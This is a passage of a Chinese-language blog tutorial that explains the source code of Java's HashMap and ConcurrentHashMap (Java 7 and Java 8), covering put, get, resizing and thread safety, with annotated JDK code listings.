n);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将新来的 node 放到新数组中刚刚的 两个链表之一 的 头部</span></span><br><span class="line">    <span class="keyword">int</span> nodeIndex = node.hash &amp; sizeMask; <span class="comment">// add the new node</span></span><br><span class="line">    node.setNext(newTable[nodeIndex]);</span><br><span class="line">    newTable[nodeIndex] = node;</span><br><span class="line">    table = newTable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的扩容比之前的 HashMap 要复杂一些，代码难懂一点。上面有两个挨着的 for 循环，第一个 for 有什么用呢？</p><p>仔细一看发现，如果没有第一个 for 循环，也是可以工作的，但是，这个 for 循环下来，如果 lastRun 的后面还有比较多的节点，那么这次就是值得的。因为我们只需要克隆 lastRun 前面的节点，后面的一串节点跟着 lastRun 走就是了，不需要做任何操作。</p><p>我觉得 Doug Lea 的这个想法也是挺有意思的，不过比较坏的情况就是每次 lastRun 都是链表的最后一个元素或者很靠后的元素，那么这次遍历就有点浪费了。<strong>不过 Doug Lea 也说了，根据统计，如果使用默认的阈值，大约只有 1/6 的节点需要克隆</strong>。</p><h3><span id="get-过程分析">get 过程分析</span></h3><p>相对于 put 来说，get 真的不要太简单。</p><ol><li>计算 hash 值，找到 segment 数组中的具体位置，或我们前面用的“槽”</li><li>槽中也是一个数组，根据 hash 找到数组中具体的位置</li><li>到这里是链表了，顺着链表进行查找即可</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Segment&lt;K,V&gt; s; <span class="comment">// manually integrate access methods to reduce overhead</span></span><br><span class="line">    HashEntry&lt;K,V&gt;[] tab;</span><br><span class="line">    <span class="comment">// 1. hash 值</span></span><br><span class="line">    <span class="keyword">int</span> h = hash(key);</span><br><span class="line">    <span class="keyword">long</span> u = (((h &gt;&gt;&gt; segmentShift) &amp; segmentMask) &lt;&lt; SSHIFT) + SBASE;</span><br><span class="line">    <span class="comment">// 2. 根据 hash 找到对应的 segment</span></span><br><span class="line">    <span class="keyword">if</span> ((s = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(segments, u)) != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        (tab = s.table) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 3. 找到segment 内部数组相应位置的链表，遍历</span></span><br><span class="line">        <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = (HashEntry&lt;K,V&gt;) UNSAFE.getObjectVolatile</span><br><span class="line">                 (tab, ((<span class="keyword">long</span>)(((tab.length - <span class="number">1</span>) &amp; h)) &lt;&lt; TSHIFT) + TBASE);</span><br><span class="line">             e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            K k;</span><br><span class="line">            <span class="keyword">if</span> ((k = e.key) == key || (e.hash == h &amp;&amp; key.equals(k)))</span><br><span class="line">                <span class="keyword">return</span> e.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="并发问题分析">并发问题分析</span></h3><p>现在我们已经说完了 put 过程和 get 过程，我们可以看到 get 过程中是没有加锁的，那自然我们就需要去考虑并发问题。</p><p>添加节点的操作 put 和删除节点的操作 remove 都是要加 segment 上的独占锁的，所以它们之间自然不会有问题，我们需要考虑的问题就是 get 的时候在同一个 segment 中发生了 put 或 remove 操作。</p><ol><li><p>put 操作的线程安全性。</p><ol><li>初始化槽，这个我们之前就说过了，使用了 CAS 来初始化 Segment 中的数组。</li><li>添加节点到链表的操作是插入到表头的，所以，如果这个时候 get 操作在链表遍历的过程已经到了中间，是不会影响的。当然，另一个并发问题就是 get 操作在 put 之后，需要保证刚刚插入表头的节点被读取，这个依赖于 setEntryAt 方法中使用的 UNSAFE.putOrderedObject。</li><li>扩容。扩容是新创建了数组，然后进行迁移数据，最后面将 newTable 设置给属性 table。所以，如果 get 操作此时也在进行，那么也没关系，如果 get 先行，那么就是在旧的 table 上做查询操作；而 put 先行，那么 put 操作的可见性保证就是 table 使用了 volatile 关键字。</li></ol></li><li><p>remove 操作的线程安全性。</p><p>remove 操作我们没有分析源码，所以这里说的读者感兴趣的话还是需要到源码中去求实一下的。</p><p>get 操作需要遍历链表，但是 remove 操作会”破坏”链表。</p><p>如果 remove 破坏的节点 get 操作已经过去了，那么这里不存在任何问题。</p><p>如果 remove 先破坏了一个节点，分两种情况考虑。  1、如果此节点是头结点，那么需要将头结点的 next 设置为数组该位置的元素，table 虽然使用了 volatile 修饰，但是 volatile 并不能提供数组内部操作的可见性保证，所以源码中使用了 UNSAFE 来操作数组，请看方法 setEntryAt。2、如果要删除的节点不是头结点，它会将要删除节点的后继节点接到前驱节点中，这里的并发保证就是 next 属性是 volatile 的。</p></li></ol><h2><span id="java8-hashmap">Java8 HashMap</span></h2><p>Java8 对 HashMap 进行了一些修改，最大的不同就是利用了红黑树，所以其由 <strong>数组+链表+红黑树</strong> 组成。</p><p>根据 Java7 HashMap 的介绍，我们知道，查找的时候，根据 hash 值我们能够快速定位到数组的具体下标，但是之后的话，需要顺着链表一个个比较下去才能找到我们需要的，时间复杂度取决于链表的长度，为 <strong>O(n)</strong>。</p><p>为了降低这部分的开销，在 Java8 中，当链表中的元素达到了 8 个时，会将链表转换为红黑树，在这些位置进行查找的时候可以降低时间复杂度为 <strong>O(logN)</strong>。</p><p>来一张图简单示意一下吧：</p><p><img src="https://www.javadoop.com/blogimages/map/2.png" alt="2"></p><blockquote><p>注意，上图是示意图，主要是描述结构，不会达到这个状态的，因为这么多数据的时候早就扩容了。</p></blockquote><p>下面，我们还是用代码来介绍吧，个人感觉，Java8 的源码可读性要差一些，不过精简一些。</p><p>Java7 中使用 Entry 来代表每个 HashMap 中的数据节点，Java8 中使用 <strong>Node</strong>，基本没有区别，都是 key，value，hash 和 next 这四个属性，不过，Node 只能用于链表的情况，红黑树的情况需要使用 <strong>TreeNode</strong>。</p><p>我们根据数组元素中，第一个节点数据类型是 Node 还是 TreeNode 来判断该位置下是链表还是红黑树的。</p><h3><span id="put-过程分析">put 过程分析</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四个参数 onlyIfAbsent 如果是 true，那么只有在不存在该 key 时才会进行 put 操作</span></span><br><span class="line"><span class="comment">// 第五个参数 evict 我们这里不关心</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">// 第一次 put 值的时候，会触发下面的 resize()，类似 java7 的第一次 put 也要初始化数组长度</span></span><br><span class="line">    <span class="comment">// 第一次 resize 和后续的扩容有些不一样，因为这次是数组从 null 初始化到默认的 16 或自定义的初始容量</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// 找到具体的数组下标，如果此位置没有值，那么直接初始化一下 Node 并放置在这个位置就可以了</span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// 数组该位置有数据</span></span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// 首先，判断该位置的第一个数据和我们要插入的数据，key 是不是"相等"，如果是，取出这个节点</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// 如果该节点是代表红黑树的节点，调用红黑树的插值方法，本文不展开说红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 到这里，说明数组该位置上是一个链表</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="comment">// 插入到链表的最后面(Java7 是插入到链表的最前面)</span></span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">// TREEIFY_THRESHOLD 为 8，所以，如果新插入的值是链表中的第 8 个</span></span><br><span class="line">                    <span class="comment">// 会触发下面的 treeifyBin，也就是将链表转换为红黑树</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果在该链表中找到了"相等"的 key(== 或 equals)</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="comment">// 此时 break，那么 e 为链表中[与要插入的新值的 key "相等"]的 node</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// e!=null 说明存在旧值的key与要插入的key"相等"</span></span><br><span class="line">        <span class="comment">// 对于我们分析的put操作，下面这个 if 其实就是进行 "值覆盖"，然后返回旧值</span></span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// 如果 HashMap 由于新插入这个值导致 size 已经超过了阈值，需要进行扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和 Java7 稍微有点不一样的地方就是，Java7 是先扩容后插入新值的，Java8 先插值再扩容，不过这个不重要。</p><h4><span id="数组扩容">数组扩容</span></h4><p>resize() 方法用于<strong>初始化数组</strong>或<strong>数组扩容</strong>，每次扩容后，容量为原来的 2 倍，并进行数据迁移。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">    <span class="keyword">int</span> oldCap = (oldTab == <span class="keyword">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">    <span class="keyword">int</span> oldThr = threshold;</span><br><span class="line">    <span class="keyword">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123; <span class="comment">// 对应数组扩容</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> oldTab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将数组大小扩大一倍</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">            <span class="comment">// 将阈值扩大一倍</span></span><br><span class="line">            newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// 对应使用 new HashMap(int initialCapacity) 初始化后，第一次 put 的时候</span></span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// 对应使用 new HashMap() 初始化后，第一次 put 的时候</span></span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">        newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    threshold = newThr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用新的数组大小初始化新的数组</span></span><br><span class="line">    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">    table = newTab; <span class="comment">// 如果是初始化数组，到这里就结束了，返回 newTab 即可</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 开始遍历原数组，进行数据迁移。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e;</span><br><span class="line">            <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                oldTab[j] = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">// 如果该数组位置上只有单个元素，那就简单了，简单迁移这个元素就可以了</span></span><br><span class="line">                <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)</span><br><span class="line">                    newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                <span class="comment">// 如果是红黑树，具体我们就不展开了</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">                <span class="keyword">else</span> &#123; </span><br><span class="line">                    <span class="comment">// 这块是处理链表的情况，</span></span><br><span class="line">                    <span class="comment">// 需要将此链表拆成两个链表，放到新的数组中，并且保留原来的先后顺序</span></span><br><span class="line">                    <span class="comment">// loHead、loTail 对应一条链表，hiHead、hiTail 对应另一条链表，代码还是比较简单的</span></span><br><span class="line">                    Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; next;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        next = e.next;</span><br><span class="line">                        <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                                loHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                loTail.next = e;</span><br><span class="line">                            loTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                                hiHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hiTail.next = e;</span><br><span class="line">                            hiTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="comment">// 第一条链表</span></span><br><span class="line">                        newTab[j] = loHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="comment">// 第二条链表的新的位置是 j + oldCap，这个很好理解</span></span><br><span class="line">                        newTab[j + oldCap] = hiHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newTab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="get-过程分析">get 过程分析</span></h3><p>相对于 put 来说，get 真的太简单了。</p><ol><li>计算 key 的 hash 值，根据 hash 值找到对应数组下标: hash &amp; (length-1)</li><li>判断数组该位置处的元素是否刚好就是我们要找的，如果不是，走第三步</li><li>判断该元素类型是否是 TreeNode，如果是，用红黑树的方法取数据，如果不是，走第四步</li><li>遍历链表，直到找到相等(==或equals)的 key</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">getNode</span><span class="params">(<span class="keyword">int</span> hash, Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="keyword">int</span> n; K k;</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断第一个节点是不是就是需要的</span></span><br><span class="line">        <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">            ((k = first.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        <span class="keyword">if</span> ((e = first.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断是否是红黑树</span></span><br><span class="line">            <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 链表遍历</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="java8-concurrenthashmap">Java8 ConcurrentHashMap</span></h2><p>Java7 中实现的 ConcurrentHashMap 说实话还是比较复杂的，Java8 对 ConcurrentHashMap 进行了比较大的改动。建议读者可以参考 Java8 中 HashMap 相对于 Java7 HashMap 的改动，对于 ConcurrentHashMap，Java8 也引入了红黑树。</p><p><strong>说实话，Java8 ConcurrentHashMap 源码真心不简单，最难的在于扩容，数据迁移操作不容易看懂。</strong></p><p>我们先用一个示意图来描述下其结构：</p><p><img src="https://www.javadoop.com/blogimages/map/4.png" alt="4"></p><p>结构上和 Java8 的 HashMap 基本上一样，不过它要保证线程安全性，所以在源码上确实要复杂一些。</p><h3><span id="初始化">初始化</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这构造函数里，什么都不干</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    <span class="keyword">int</span> cap = ((initialCapacity &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ?</span><br><span class="line">               MAXIMUM_CAPACITY :</span><br><span class="line">               tableSizeFor(initialCapacity + (initialCapacity &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">this</span>.sizeCtl = cap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个初始化方法有点意思，通过提供初始容量，计算了 sizeCtl，sizeCtl = 【 (1.5 * initialCapacity + 1)，然后向上取最近的 2 的 n 次方】。如 initialCapacity 为 10，那么得到 sizeCtl 为 16，如果 initialCapacity 为 11，得到 sizeCtl 为 32。</p><p>sizeCtl 这个属性使用的场景很多，不过只要跟着文章的思路来，就不会被它搞晕了。</p><p>如果你爱折腾，也可以看下另一个有三个参数的构造方法，这里我就不说了，大部分时候，我们会使用无参构造函数进行实例化，我们也按照这个思路来进行源码分析吧。</p><h3><span id="put-过程分析">put 过程分析</span></h3><p>仔细地一行一行代码看下去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(key, value, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 